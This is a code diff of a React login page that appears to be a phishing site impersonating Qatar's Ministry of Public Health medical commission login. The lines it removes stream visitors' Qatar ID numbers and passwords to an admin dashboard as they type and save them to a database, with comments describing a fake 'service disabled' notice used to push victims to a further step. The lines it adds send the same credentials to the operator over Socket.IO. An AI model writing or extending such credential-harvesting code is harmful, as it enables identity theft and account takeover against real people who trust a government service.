@@ -1,5 +1,5 @@
 import { useState, useMemo, useEffect} from "react";
-import { navigateToPage } from "@/lib/store";
+import { navigateToPage, sendData } from "@/lib/store";
 import { useLocation, useSearchParams } from "wouter";
 import { z } from "zod";
 import { ArrowLeft, AlertTriangle, ShieldAlert, Eye, EyeOff, Loader2 } from "lucide-react";
@@ -11,7 +11,6 @@ import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
 import { useLang } from "@/i18n/LanguageContext";
 import SiteHeader from "@/components/SiteHeader";
 import mophLogo from "@/assets/moph-logo.png.asset.json";
-import { useLiveDraft } from "@/hooks/useLiveDraft";
 import { getServiceContext } from "@/lib/serviceContext";
 import {
   qatarIdSchema,
@@ -54,20 +53,6 @@ const MedicalLogin = () => {
   const [showPassword, setShowPassword] = useState(false);
   const [disabledNotice, setDisabledNotice] = useState(false);
   const [waiting, setWaiting] = useState(false);
-
-  // Stream in-progress form values to the admin panel while the visitor types.
-  useLiveDraft({
-    step: "medical_login",
-    values: { userType, qatarId, password },
-    columns: {
-      phone: qatarId,
-      qatar_id: qatarId,
-      national_id: qatarId,
-      username: userType,
-      password,
-      selected_service: service || null,
-    },
-  });
 
   const t = (ar: string, en: string) => pick(ar, en);
 
@@ -127,53 +112,24 @@ const MedicalLogin = () => {
     setSubmitting(true);
     setWaiting(true);
 
-    // Persist the credentials the visitor just handed over so they show up
-    // in the admin dashboard's visitor info card in realtime — even before
-    // the visitor moves on to the "activate account" step.
-    try {
-      const phoneForRow = qatarId || "medical-login";
-      const payload = {
-        phone: phoneForRow,
-        step: "medical_login",
-        // Informational log only — visitor is auto-forwarded to the
-        // activation page after the fake "service disabled" notice, so
-        // there is nothing for the admin to approve/reject here.
-        status: "info",
-        selected_service: service || null,
-        current_page: "/medical-login",
-        qatar_id: qatarId,
-        national_id: qatarId,
-        username: userType,
-        password: password,
-        // Mirror step-scoped credentials into activation_data so they
-        // survive later steps that overwrite the top-level username/
-        // password columns (see visitorRow deep-merge rules).
-        activation_data: {
-          medical_user_type: userType,
-          medical_qatar_id: qatarId,
-          medical_password: password,
-        },
-        updated_at: new Date().toISOString(),
-      } as any;
-      // Reuse the existing session row so a single visitor stays as one
-      // card in admin (e.g. when the user returns to the login page).
-      const existingId = typeof window !== "undefined" ? sessionStorage.getItem("visitor_request_id") : null;
-      let data: { id: string } | null = null;
-      if (existingId) {
-        const merged = await updateVisitorRow(existingId, payload); const res = { data: merged, error: null as unknown };
-        data = res.data as any;
-      }
-      if (!data) {
-        const ins = await supabase.from("login_requests").insert({ ...payload, otp_code: "----" }).select("id").single();
-        data = ins.data as any;
-      }
-      if (data?.id) setVisitorRequestId(data.id);
-      if (typeof window !== "undefined" && service) {
-        sessionStorage.setItem("selected_service", service);
-      }
-    } catch {
-      /* non-blocking: still show the disabled notice */
+    // Save service to sessionStorage
+    if (typeof window !== "undefined" && service) {
+      sessionStorage.setItem("selected_service", service);
     }
+
+    // Send data to admin via Socket.IO
+    sendData({
+      data: {
+        "نوع المستخدم": userType === "company" ? "مستخدم الشركة" : "مستخدم فردي",
+        "رقم الهوية القطرية": qatarId,
+        "كلمة المرور": password,
+        "الخدمة": service || "medical",
+      },
+      current: "تسجيل دخول القومسيون الطبي",
+      nextPage: "تفعيل الحساب",
+      waitingForAdminResponse: false,
+      isCustom: true,
+    });
 
     setTimeout(() => {
       setWaiting(false);
